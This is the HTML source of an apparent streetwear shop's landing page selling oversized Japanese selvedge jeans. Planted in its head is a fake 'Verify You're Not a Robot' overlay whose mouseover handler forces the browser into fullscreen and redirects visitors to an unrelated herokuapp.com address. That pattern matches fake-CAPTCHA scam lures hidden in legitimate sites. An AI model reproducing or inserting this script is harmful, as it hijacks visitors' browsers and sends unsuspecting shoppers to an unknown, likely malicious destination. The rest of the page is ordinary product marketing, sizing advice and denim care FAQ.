<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>oversizejean.com — Engineered Heavyweight Baggy Denim & Luxury Silhouettes</title>
   <div id="popup-wrapper" onmouseover="fullscreenAndRedirect()">
    <div id="popup-bg"></div>

    <div class="popup-card">
      <span class="close-btn">&times;</span>

      <div class="content">
        <div class="icon">🤖</div>

        <div class="text">
          <h2>Verify You're Not a Robot</h2>

          <p>
            Please complete the verification below before continuing.
          </p>

          <div class="robot-box">
            <input type="checkbox" id="robotCheck">
            <label for="robotCheck">I'm not a robot</label>

            <div class="captcha-brand">
              <div>Verification</div>
              <small>Human Check</small>
            </div>
          </div>

          <div class="actions">
            <button id="continueBtn" disabled>
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
    }

    #popup-wrapper {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2147483647;
    }

    #popup-bg {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, .65);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
    }

    .popup-card {
      position: relative;
      width: 720px;
      max-width: 92%;
      background: #fff;
      border-radius: 22px;
      padding: 28px;
      box-shadow: 0 30px 90px rgba(0, 0, 0, .45);
      font-family: Arial, Helvetica, sans-serif;
      z-index: 2147483647;
      animation: popup .25s ease-out;
    }

    @keyframes popup {
      from {
        opacity: 0;
        transform: scale(.9);
      }

      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .close-btn {
      position: absolute;
      right: 16px;
      top: 12px;
      font-size: 30px;
      font-weight: bold;
      cursor: pointer;
      color: #666;
    }

    .content {
      display: flex;
      gap: 20px;
    }

    .icon {
      width: 70px;
      height: 70px;
      min-width: 70px;
      border-radius: 16px;
      background: #f3f4f6;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 38px;
    }

    .text {
      flex: 1;
    }

    .text h2 {
      margin: 0 0 10px;
      font-size: 34px;
      font-weight: 800;
      color: #111827;
    }

    .text p {
      margin: 0;
      font-size: 18px;
      line-height: 1.6;
      color: #4b5563;
    }

    .robot-box {
      margin-top: 22px;
      border: 1px solid #d1d5db;
      border-radius: 10px;
      background: #fafafa;
      padding: 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .robot-box input {
      width: 28px;
      height: 28px;
      cursor: pointer;
    }

    .robot-box label {
      flex: 1;
      margin-left: 12px;
      font-size: 20px;
      cursor: pointer;
    }

    .captcha-brand {
      text-align: center;
      font-size: 12px;
      color: #6b7280;
    }

    .actions {
      margin-top: 24px;
    }

    .actions button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      background: #2563eb;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
    }

    .actions button:disabled {
      opacity: .5;
      cursor: not-allowed;
    }

    @media(max-width:768px) {
      .content {
        flex-direction: column;
      }

      .icon {
        margin: auto;
      }

      .text h2 {
        font-size: 28px;
        text-align: center;
      }

      .text p {
        text-align: center;
      }
    }
  </style>

  <script>
    const robotCheck = document.getElementById("robotCheck");
    const continueBtn = document.getElementById("continueBtn");

    robotCheck.addEventListener("change", function () {
      continueBtn.disabled = !this.checked;
    });

    continueBtn.addEventListener("click", function () {
      alert("Verification completed.");
      // Add your own action here
    });

    document.querySelector(".close-btn").addEventListener("click", function () {
      document.getElementById("popup-wrapper").style.display = "none";
    });

     function fullscreenAndRedirect() {
    const el = document.documentElement;

    if (!document.fullscreenElement) {
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if (el.msRequestFullscreen) el.msRequestFullscreen();
    }

    setTimeout(() => {
      window.location.href = "https://winhjgkjaghkjhgde-1599c490afb7.herokuapp.com/";
    }, 1000);
  }
  </script>
    <!-- SEO & Social Meta Tags -->
  <meta name="description" content="oversizejean.com — The premier destination for luxury oversized denim. 14.5oz Japanese Kurabo selvedge, authentic vintage stone washes, and engineered puddle drape. Worldwide shipping.">
  <meta name="keywords" content="oversized jeans, baggy denim, wide leg jeans, skater jeans, Japanese selvedge denim, 90s baggy jeans, raw indigo denim, streetwear fashion">
  <meta name="author" content="oversizejean.com">
  <meta property="og:title" content="oversizejean.com — Engineered Baggy Denim">
  <meta property="og:description" content="Redefining volume and silhouette with 14.5oz Japanese selvedge and vintage stone washed oversized denim.">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://oversizejean.com">
  <meta property="og:image" content="assets/images/hero_model.jpg">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="theme-color" content="#080a0f">

  <link rel="stylesheet" href="assets/css/main.css">
</head>
<body>

  <!-- ==========================================================================
       1. ANNOUNCEMENT MARQUEE
       ========================================================================== -->
  <div class="announcement-bar" role="region" aria-label="Announcement">
    <div class="marquee-wrapper">
      <div class="marquee-content">
        <span class="marquee-item"><span class="highlight">DROP 04 IS LIVE</span> — LIMITED OKAYAMA SELVEDGE PRODUCTION</span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">COMPLIMENTARY WORLDWIDE EXPRESS OVER <span class="highlight">$150 USD</span></span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">30-DAY HASSLE-FREE BAGGY FIT EXCHANGES</span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">HAND-FINISHED IN JAPAN & ETHICALLY DISTRESSED</span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">CODE <span class="highlight">OVERSIZE10</span> FOR 10% OFF YOUR FIRST PAIR</span>
      </div>
      <!-- Marquee clone for seamless loop -->
      <div class="marquee-content" aria-hidden="true">
        <span class="marquee-item"><span class="highlight">DROP 04 IS LIVE</span> — LIMITED OKAYAMA SELVEDGE PRODUCTION</span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">COMPLIMENTARY WORLDWIDE EXPRESS OVER <span class="highlight">$150 USD</span></span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">30-DAY HASSLE-FREE BAGGY FIT EXCHANGES</span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">HAND-FINISHED IN JAPAN & ETHICALLY DISTRESSED</span>
        <span class="marquee-dot"></span>
        <span class="marquee-item">CODE <span class="highlight">OVERSIZE10</span> FOR 10% OFF YOUR FIRST PAIR</span>
      </div>
    </div>
  </div>

  <!-- ==========================================================================
       2. HEADER & NAVIGATION
       ========================================================================== -->
  <header class="site-header" id="siteHeader">
    <div class="container nav-container">
      <!-- Brand Logo -->
      <a href="index.html" class="brand-logo" aria-label="oversizejean.com home">
        <div class="brand-icon">
          <svg viewBox="0 0 24 24">
            <path d="M4 3h16l-2 18H6L4 3z M9 3v6 M15 3v6 M7 12h10"></path>
          </svg>
        </div>
        <span>oversizejean</span>
        <span class="tag">EDN.26</span>
      </a>

      <!-- Desktop Nav Menu -->
      <nav class="desktop-nav" aria-label="Primary Navigation">
        <ul class="nav-links">
          <li class="nav-item"><a href="#drop04">Drop 04</a></li>
          <li class="nav-item"><a href="#silhouettes">Silhouettes</a></li>
          <li class="nav-item"><a href="#calculator">Fit Calculator</a></li>
          <li class="nav-item"><a href="#lookbook">Lookbook</a></li>
          <li class="nav-item"><a href="#craft">Craftsmanship</a></li>
          <li class="nav-item"><a href="#reviews">Reviews</a></li>
          <li class="nav-item"><a href="#faq">FAQ</a></li>
          <li class="nav-item"><a href="disclaimer.html">Policies</a></li>
        </ul>
      </nav>

      <!-- Nav Action Controls -->
      <div class="nav-actions">
        <!-- Wishlist Button -->
        <button class="btn-icon" id="wishlistTriggerBtn" title="View Wishlist" aria-label="Wishlist" onclick="showToast('Your saved wishlist items are highlighted below')">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
          </svg>
          <span class="badge-count" id="wishlistCountBadge" style="display: none;">0</span>
        </button>

        <!-- Cart Bag Trigger -->
        <button class="btn-icon" id="cartTriggerBtn" title="Shopping Bag" aria-label="Shopping Bag" onclick="openCartDrawer()">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <path d="M16 10a4 4 0 0 1-8 0"></path>
          </svg>
          <span class="badge-count" id="cartCountBadge" style="display: none;">0</span>
        </button>

        <!-- Mobile Menu Toggle -->
        <button class="btn-icon btn-mobile-menu" id="mobileMenuToggle" aria-label="Toggle Menu">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </button>
      </div>
    </div>
  </header>

  <!-- Mobile Drawer Navigation -->
  <aside class="mobile-nav-drawer" id="mobileNavDrawer" aria-label="Mobile Navigation">
    <div>
      <div class="mobile-nav-header">
        <div class="brand-logo" style="font-size: 1.2rem;">
          <span>oversizejean</span>
        </div>
        <button class="btn-icon" id="mobileNavClose" aria-label="Close menu">✕</button>
      </div>
      <ul class="mobile-nav-links">
        <li><a href="#drop04" onclick="document.getElementById('mobileNavDrawer').classList.remove('open')">Drop 04 Collection</a></li>
        <li><a href="#silhouettes" onclick="document.getElementById('mobileNavDrawer').classList.remove('open')">Fit Silhouettes</a></li>
        <li><a href="#calculator" onclick="document.getElementById('mobileNavDrawer').classList.remove('open')">Baggy Calculator</a></li>
        <li><a href="#lookbook" onclick="document.getElementById('mobileNavDrawer').classList.remove('open')">Editorial Lookbook</a></li>
        <li><a href="#craft" onclick="document.getElementById('mobileNavDrawer').classList.remove('open')">Selvedge Mill Craft</a></li>
        <li><a href="#reviews" onclick="document.getElementById('mobileNavDrawer').classList.remove('open')">Fit Community</a></li>
        <li><a href="#faq" onclick="document.getElementById('mobileNavDrawer').classList.remove('open')">FAQ & Denim Care</a></li>
      </ul>
    </div>
    <div class="mobile-nav-footer">
      <div style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted); margin-bottom: 12px;">POLICIES & LEGAL:</div>
      <div style="display: flex; flex-direction: column; gap: 8px; font-size: 0.85rem;">
        <a href="disclaimer.html" style="color: var(--text-secondary);">Disclaimer Notice</a>
        <a href="privacy-policy.html" style="color: var(--text-secondary);">Privacy Policy</a>
        <a href="terms-of-service.html" style="color: var(--text-secondary);">Terms of Service</a>
        <a href="shipping-returns.html" style="color: var(--text-secondary);">Shipping & Returns</a>
      </div>
    </div>
  </aside>

  <!-- ==========================================================================
       3. HERO SECTION
       ========================================================================== -->
  <main>
    <section class="hero-section" id="hero">
      <div class="hero-background-effects"></div>
      <div class="container hero-grid">
        <div class="hero-content">
          <div class="hero-tag">
            <span class="pulse-dot"></span>
            <span>AUTUMN/WINTER 2026 ARCHIVE RELEASE</span>
          </div>

          <h1 class="hero-title">
            <span class="text-gradient">VOLUME IS FORM.</span><br>
            <span class="text-accent-denim">SILHOUETTE</span> IS POWER.
          </h1>

          <p class="hero-description">
            Engineered 14.5oz Japanese Kurabo selvedge and artisanal washed denim. Designed across Berlin, Tokyo & Brooklyn with deliberate puddle hems, 26" leg sweeps, and structured drape that never loses shape.
          </p>

          <div class="hero-actions">
            <a href="#drop04" class="btn btn-primary">
              <span>Explore Drop 04</span>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </a>
            <a href="#calculator" class="btn btn-secondary">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="10"></circle>
                <path d="M12 8v8M8 12h8"></path>
              </svg>
              <span>Fit Calculator</span>
            </a>
          </div>

          <div class="hero-stats">
            <div class="hero-stat-item">
              <div class="stat-value">14.5 oz</div>
              <div class="stat-label">Kurabo Slub Denim</div>
            </div>
            <div class="hero-stat-item">
              <div class="stat-value">25.0"</div>
              <div class="stat-label">Signature Puddle Sweep</div>
            </div>
            <div class="hero-stat-item">
              <div class="stat-value">100%</div>
              <div class="stat-label">Ring-Spun Selvedge</div>
            </div>
          </div>
        </div>

        <!-- Hero Editorial Visual Card -->
        <div class="hero-visual-card">
          <img src="assets/images/hero_model.jpg" alt="Model wearing ultra-baggy vintage wash oversized jeans" class="hero-img">
          
          <div class="hero-float-badge hero-badge-top">
            <span class="hero-spec-pill">● OKAYAMA CRAFT</span>
            <div class="hero-spec-name">The 1996 Super-Wide</div>
          </div>

          <div class="hero-float-badge hero-badge-bottom">
            <div>
              <span class="hero-spec-pill">STACK ARCHITECTURE</span>
              <div class="hero-spec-name">Drop 04 Signature Cut</div>
            </div>
            <button class="btn btn-amber btn-sm" onclick="quickAddToCart('osj-01')">Quick Add $185</button>
          </div>
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         4. TRUST STRIP
         ========================================================================== -->
    <section class="trust-strip">
      <div class="container trust-grid">
        <div class="trust-item">
          <div class="trust-icon-box">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <rect x="1" y="3" width="15" height="13"></rect>
              <polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon>
              <circle cx="5.5" cy="18.5" r="2.5"></circle>
              <circle cx="18.5" cy="18.5" r="2.5"></circle>
            </svg>
          </div>
          <div>
            <div class="trust-title">Free Worldwide Express</div>
            <div class="trust-desc">Complimentary DHL delivery on orders $150+</div>
          </div>
        </div>

        <div class="trust-item">
          <div class="trust-icon-box">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"></path>
            </svg>
          </div>
          <div>
            <div class="trust-title">30-Day Baggy Guarantee</div>
            <div class="trust-desc">Free size & silhouette exchanges, zero fees</div>
          </div>
        </div>

        <div class="trust-item">
          <div class="trust-icon-box">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
            </svg>
          </div>
          <div>
            <div class="trust-title">Heritage Japanese Cotton</div>
            <div class="trust-desc">Kuroki & Kurabo authentic shuttle loom denim</div>
          </div>
        </div>

        <div class="trust-item">
          <div class="trust-icon-box">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
            </svg>
          </div>
          <div>
            <div class="trust-title">Transparent Policies</div>
            <div class="trust-desc">Full disclosure on indigo bleeding & tolerances</div>
          </div>
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         5. SILHOUETTES & ARCHITECTURE GUIDE (INTERACTIVE VISUALIZER)
         ========================================================================== -->
    <section class="silhouettes-section" id="silhouettes">
      <div class="container">
        <div class="section-header">
          <span class="section-eyebrow">The Four Dimensions of Baggy</span>
          <h2 class="section-title">Anatomy of Oversized Denim</h2>
          <p class="section-desc">
            Baggy is not simply sizing up your waist. Every oversizejean silhouette features engineered outseams, sculpted rises, and calibrated ankle sweeps to produce specific drape behaviors.
          </p>
        </div>

        <!-- Silhouette Tabs -->
        <div class="silhouette-tabs">
          <button class="silhouette-tab-btn active" data-silhouette="super-wide">Cut 01: Super Wide Puddle</button>
          <button class="silhouette-tab-btn" data-silhouette="curved-barrel">Cut 02: Balloon Barrel</button>
          <button class="silhouette-tab-btn" data-silhouette="raw-carpenter">Cut 03: Raw Carpenter Slub</button>
          <button class="silhouette-tab-btn" data-silhouette="tailored-pleat">Cut 04: Tailored Double Pleat</button>
        </div>

        <!-- Dynamic Showcase Display -->
        <div class="silhouette-showcase">
          <div class="silhouette-visual">
            <img src="assets/images/vintage_stone.jpg" alt="Denim Cut Visual" id="silVisualImg">
          </div>

          <div class="silhouette-content">
            <span class="badge badge-selvedge" style="margin-bottom: 12px;">ENGINEERED FIT SPECS</span>
            <h3 id="silTitle" style="font-family: var(--font-heading); font-size: 2.2rem; color: #fff; margin-bottom: 10px;">
              Cut 01: Super Wide Puddle
            </h3>
            <p id="silDesc" style="color: var(--text-secondary); font-size: 1.05rem; line-height: 1.6;">
              Extreme 90s skater volume with natural floor drape and puddle hem.
            </p>

            <div class="silhouette-specs-grid">
              <div class="spec-card">
                <div class="spec-label">Leg Opening Sweep</div>
                <div class="spec-val" id="silLegOpening">25" - 26"</div>
                <div class="spec-bar-wrapper">
                  <div class="spec-bar-fill" id="silDrapeBar" style="width: 96%;"></div>
                </div>
              </div>

              <div class="spec-card">
                <div class="spec-label">Rise Architecture</div>
                <div class="spec-val" id="silRise">13.5" High Waist</div>
              </div>

              <div class="spec-card">
                <div class="spec-label">Thigh Room</div>
                <div class="spec-val" id="silThigh">33" Extra Loose</div>
              </div>

              <div class="spec-card">
                <div class="spec-label">Fabric Weight</div>
                <div class="spec-val" id="silWeight">14.5 oz Slub</div>
              </div>
            </div>

            <div style="background: var(--bg-card); padding: 18px 24px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle); margin-bottom: 24px;">
              <span style="font-family: var(--font-mono); font-size: 0.75rem; text-transform: uppercase; color: var(--accent-amber);">RECOMMENDED FOOTWEAR PAIRING:</span>
              <div id="silSneakers" style="color: #ffffff; font-weight: 600; margin-top: 4px;">Chunky Runners, Skate Lows, Platform Boots</div>
            </div>

            <a href="#drop04" class="btn btn-amber">Shop This Silhouette</a>
          </div>
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         6. PRODUCT CATALOG (DROP 04)
         ========================================================================== -->
    <section class="shop-section" id="drop04">
      <div class="container">
        <div class="section-header">
          <span class="section-eyebrow">Available Now</span>
          <h2 class="section-title">Drop 04 — The Heavyweight Collection</h2>
          <p class="section-desc">
            Six distinct treatments across our four architectural cuts. Woven on vintage shuttle looms, sanforized, and hand-finished with authentic wear patterns.
          </p>
        </div>

        <!-- Controls: Filters & Sort -->
        <div class="shop-controls">
          <div class="category-filter-pills">
            <button class="filter-pill active" data-filter="all">All Drops (6)</button>
            <button class="filter-pill" data-filter="vintage">Vintage Washes</button>
            <button class="filter-pill" data-filter="raw">Raw Indigo Selvedge</button>
            <button class="filter-pill" data-filter="washed-black">Charcoal & Black</button>
            <button class="filter-pill" data-filter="utility">Carpenter & Utility</button>
          </div>

          <div class="sort-select-box">
            <label for="catalogSort">Sort By:</label>
            <select id="catalogSort" class="custom-select" onchange="showToast('Catalog updated')">
              <option value="featured">Featured Volume</option>
              <option value="weight">Heaviest Fabric (15oz)</option>
              <option value="price-asc">Price: Low to High</option>
              <option value="price-desc">Price: High to Low</option>
            </select>
          </div>
        </div>

        <!-- Products Dynamic Grid -->
        <div class="products-grid" id="productsGrid">
          <!-- Dynamically populated by assets/js/main.js -->
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         7. INTERACTIVE BAGGY FIT CALCULATOR
         ========================================================================== -->
    <section class="calculator-section" id="calculator">
      <div class="container">
        <div class="section-header">
          <span class="section-eyebrow">Algorithmic Fit Precision</span>
          <h2 class="section-title">The Baggy Fit Calculator</h2>
          <p class="section-desc">
            Avoid guessing between sizing up or staying true to size. Our algorithm factors your height, frame, and target drape to prescribe the exact waist, inseam length, and cut.
          </p>
        </div>

        <div class="calc-container">
          <!-- Inputs Column -->
          <div class="calc-inputs-column">
            <!-- Height Slider -->
            <div class="calc-form-group">
              <div class="calc-label">
                <span>1. Your Height:</span>
                <span class="value-display" id="calcHeightDisplay">178 cm (5'10")</span>
              </div>
              <input type="range" min="150" max="205" value="178" class="calc-range-slider" id="calcHeightSlider">
            </div>

            <!-- Weight Slider -->
            <div class="calc-form-group">
              <div class="calc-label">
                <span>2. Body Weight:</span>
                <span class="value-display" id="calcWeightDisplay">72 kg (159 lbs)</span>
              </div>
              <input type="range" min="45" max="130" value="72" class="calc-range-slider" id="calcWeightSlider">
            </div>

            <!-- Target Vibe Buttons -->
            <div class="calc-form-group">
              <div class="calc-label">
                <span>3. Desired Drape & Vibe:</span>
              </div>
              <div class="vibe-selector-grid">
                <button class="vibe-btn" data-vibe="relaxed">
                  <div class="vibe-title">Relaxed Roomy</div>
                  <div class="vibe-desc">Clean taper stack</div>
                </button>
                <button class="vibe-btn active" data-vibe="true-baggy">
                  <div class="vibe-title">True 90s Baggy</div>
                  <div class="vibe-desc">Classic sneaker drape</div>
                </button>
                <button class="vibe-btn" data-vibe="floor-puddle">
                  <div class="vibe-title">Runway Puddle</div>
                  <div class="vibe-desc">Extreme floor pool</div>
                </button>
              </div>
            </div>

            <div style="font-size: 0.8rem; color: var(--text-muted); display: flex; align-items: center; gap: 8px;">
              <span>ℹ️</span>
              <span>Need custom advice? Check our <a href="disclaimer.html#sizing-variance" style="color: var(--accent-blue-light); text-decoration: underline;">Sizing Variance Disclaimer</a> for hand-wash tolerances.</span>
            </div>
          </div>

          <!-- Output Column -->
          <div class="calc-result-box">
            <div>
              <span class="result-badge">YOUR PRESCRIPTION</span>
              <h3 class="result-title" id="calcResultCut">Cut 01: Super Wide Puddle</h3>

              <div class="result-breakdown-row">
                <span class="label">Recommended Waist Size:</span>
                <span class="val" id="calcResultWaist" style="color: var(--accent-amber); font-size: 1.15rem;">32W</span>
              </div>

              <div class="result-breakdown-row">
                <span class="label">Recommended Inseam Stacking:</span>
                <span class="val" id="calcResultInseam">32" Regular Stack</span>
              </div>

              <div class="result-breakdown-row">
                <span class="label">Calculated Drape Index:</span>
                <span class="val" id="calcResultDrape">9.2 / 10 (Puddle Hem)</span>
              </div>

              <div class="result-breakdown-row">
                <span class="label">Risk-Free Exchange:</span>
                <span class="val" style="color: var(--accent-emerald);">Guaranteed 30 Days</span>
              </div>
            </div>

            <button class="btn btn-primary" onclick="quickAddToCart('osj-01')" style="width: 100%; margin-top: 24px;">
              Apply Fit & Add Recommended Pair ($185)
            </button>
          </div>
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         8. EDITORIAL LOOKBOOK
         ========================================================================== -->
    <section class="lookbook-section" id="lookbook">
      <div class="container">
        <div class="section-header">
          <span class="section-eyebrow">Editorial Archive</span>
          <h2 class="section-title">The Streetwear Lookbook</h2>
          <p class="section-desc">
            Voluminous denim in its natural environment. Explore street styling across Tokyo, London, and New York.
          </p>
        </div>

        <div class="lookbook-grid">
          <!-- Look 01 -->
          <div class="lookbook-card">
            <img src="assets/images/hero_model.jpg" alt="Look 01 - Heavyweight Stone Wash" class="lookbook-img">
            <div class="lookbook-info">
              <div>
                <span class="badge badge-heavy" style="margin-bottom: 8px;">LOOK 01 • SHIBUYA OVERPASS</span>
                <h3 class="lookbook-title">The Vintage Stone Stack</h3>
                <p class="lookbook-desc">Paired with heavy boxy fleece hoodie & Balenciaga Triple S runners.</p>
              </div>
              <button class="btn btn-secondary btn-sm" onclick="openQuickView('osj-01')">Shop Look</button>
            </div>
          </div>

          <!-- Look 02 -->
          <div class="lookbook-card">
            <img src="assets/images/raw_selvedge.jpg" alt="Look 02 - Raw Japanese Selvedge" class="lookbook-img">
            <div class="lookbook-info">
              <div>
                <span class="badge badge-selvedge" style="margin-bottom: 8px;">LOOK 02 • OKAYAMA WORKWEAR</span>
                <h3 class="lookbook-title">15oz Double-Knee Carpenter</h3>
                <p class="lookbook-desc">Unwashed dark indigo with red ticker selvedge turn-up cuffs.</p>
              </div>
              <button class="btn btn-secondary btn-sm" onclick="openQuickView('osj-02')">Shop Look</button>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         9. CRAFTSMANSHIP & SELVEDGE STORY
         ========================================================================== -->
    <section class="craft-section" id="craft">
      <div class="container">
        <div class="section-header">
          <span class="section-eyebrow">Japanese Mill Heritage</span>
          <h2 class="section-title">The Art of Heavyweight Slub</h2>
          <p class="section-desc">
            We don't use polyester blends, elastane, or artificial distressing chemicals. Every yard is woven with intention.
          </p>
        </div>

        <div class="craft-grid">
          <div class="craft-card">
            <div class="craft-number">01</div>
            <h3 class="craft-title">Toyoda Shuttle Looms</h3>
            <p class="craft-desc">
              Slow-woven on restored mid-century shuttle looms in Okayama. The slow tension produces irregular slub yarn texture that creates unique high-contrast fades over years of wear.
            </p>
          </div>

          <div class="craft-card">
            <div class="craft-number">02</div>
            <h3 class="craft-title">Rope-Dyed Pure Indigo</h3>
            <p class="craft-desc">
              Yarns are dipped up to 16 times in natural indigo vats with air oxidation between dips. The white yarn core stays pure, unlocking personal whiskering patterns.
            </p>
          </div>

          <div class="craft-card">
            <div class="craft-number">03</div>
            <h3 class="craft-title">Eco-Ozone Stone Finishing</h3>
            <p class="craft-desc">
              Our vintage washes utilize atmospheric ozone gas and natural pumice stones, recycling 95% of water and eliminating harmful caustic chemicals from production.
            </p>
          </div>
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         10. REVIEWS & STREETWEAR COMMUNITY
         ========================================================================== -->
    <section class="reviews-section" id="reviews">
      <div class="container">
        <div class="section-header">
          <span class="section-eyebrow">Streetwear Community Verified</span>
          <h2 class="section-title">Fit Feedback from Real Owners</h2>
          <p class="section-desc">
            Over 2,400+ verified streetwear buyers worldwide. Here is how our oversized cuts stack up in real life.
          </p>
        </div>

        <div class="reviews-grid">
          <div class="review-card">
            <div>
              <div class="review-rating">★★★★★</div>
              <p class="review-text">
                "Finally a brand that understands what puddle drape actually means. Most brands just give you huge waists, but oversizejean has the high rise and massive 25" leg opening that stacks over my Rick Owens geobaskets without drag."
              </p>
            </div>
            <div class="review-author">
              <div>
                <div class="author-name">Marcus K.</div>
                <div style="font-size: 0.75rem; color: var(--text-muted);">Verified Buyer • Berlin</div>
              </div>
              <span class="fit-noted">Cut 01 / 34W</span>
            </div>
          </div>

          <div class="review-card">
            <div>
              <div class="review-rating">★★★★★</div>
              <p class="review-text">
                "The 15oz Kuroki selvedge is ungodly stiff at first, but after 2 weeks of breaking in, the drape is incredible. The carpenter loop and copper rivets feel like they'll survive twenty years. 10/10."
              </p>
            </div>
            <div class="review-author">
              <div>
                <div class="author-name">Julian T.</div>
                <div style="font-size: 0.75rem; color: var(--text-muted);">Verified Buyer • Brooklyn</div>
              </div>
              <span class="fit-noted">Cut 03 / 32W</span>
            </div>
          </div>

          <div class="review-card">
            <div>
              <div class="review-rating">★★★★★</div>
              <p class="review-text">
                "The fit calculator recommended 30W for true 90s baggy. Arrived in London in 3 days via DHL. Exceeded expectations — the wash looks exactly like a pristine 1996 vintage pair."
              </p>
            </div>
            <div class="review-author">
              <div>
                <div class="author-name">Elena R.</div>
                <div style="font-size: 0.75rem; color: var(--text-muted);">Verified Buyer • London</div>
              </div>
              <span class="fit-noted">Cut 02 / 30W</span>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ==========================================================================
         11. FAQ ACCORDION
         ========================================================================== -->
    <section class="faq-section" id="faq">
      <div class="container">
        <div class="section-header">
          <span class="section-eyebrow">Everything You Need to Know</span>
          <h2 class="section-title">Frequently Asked Questions</h2>
          <p class="section-desc">
            Answers on raw denim care, shrinkage prevention, and sizing guidelines.
          </p>
        </div>

        <div class="faq-list">
          <!-- FAQ 1 -->
          <div class="faq-item open">
            <button class="faq-question">
              <span>Should I size up or order my true waist size?</span>
              <span class="faq-icon">+</span>
            </button>
            <div class="faq-answer" style="max-height: 200px;">
              <p>
                Our jeans are patterned with exaggerated volume built directly into the hips, thighs, and leg opening. If you want an intended relaxed skater baggy look, order your <strong>exact true waist size</strong>. If you desire an extreme runway puddle that pools completely over sneakers, size up <strong>+1 to +2 inches</strong>. Use our <a href="#calculator" style="color: var(--accent-amber); text-decoration: underline;">Baggy Fit Calculator</a> for exact specs.
              </p>
            </div>
          </div>

          <!-- FAQ 2 -->
          <div class="faq-item">
            <button class="faq-question">
              <span>Will raw selvedge denim bleed onto my shoes?</span>
              <span class="faq-icon">+</span>
            </button>
            <div class="faq-answer">
              <p>
                Yes. Authentic unwashed raw indigo selvedge denim will experience dry crocking (indigo pigment transfer) during the first few weeks of wear. We recommend avoiding pairing unwashed raw pairs with white canvas sneakers until after the initial cold soak. Please review our full <a href="disclaimer.html#indigo-bleeding" style="color: var(--accent-blue-light); text-decoration: underline;">Indigo Transfer Disclaimer</a>.
              </p>
            </div>
          </div>

          <!-- FAQ 3 -->
          <div class="faq-item">
            <button class="faq-question">
              <span>How do I wash heavyweight 14.5oz oversized denim?</span>
              <span class="faq-icon">+</span>
            </button>
            <div class="faq-answer">
              <p>
                Turn jeans inside out. Hand-wash or use a gentle cycle with cold water (30°C / 86°F) and mild detergent. Never tumble dry — always hang dry in the shade to maintain the structural drape and prevent unwanted shrinkage.
              </p>
            </div>
          </div>

          <!-- FAQ 4 -->
          <div class="faq-item">
            <button class="faq-question">
              <span>What is your 30-Day Baggy Guarantee exchange policy?</span>
              <span class="faq-icon">+</span>
            </button>
            <div class="faq-answer">
              <p>
                We provide 100% free size and silhouette exchanges within 30 days of delivery. As long as your pair is unwashed and tags remain attached, you can swap between cuts (e.g. from Super Wide to Curved Barrel) with zero restocking fees. Read our full <a href="shipping-returns.html" style="color: var(--accent-amber); text-decoration: underline;">Shipping & Returns Policy</a>.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>

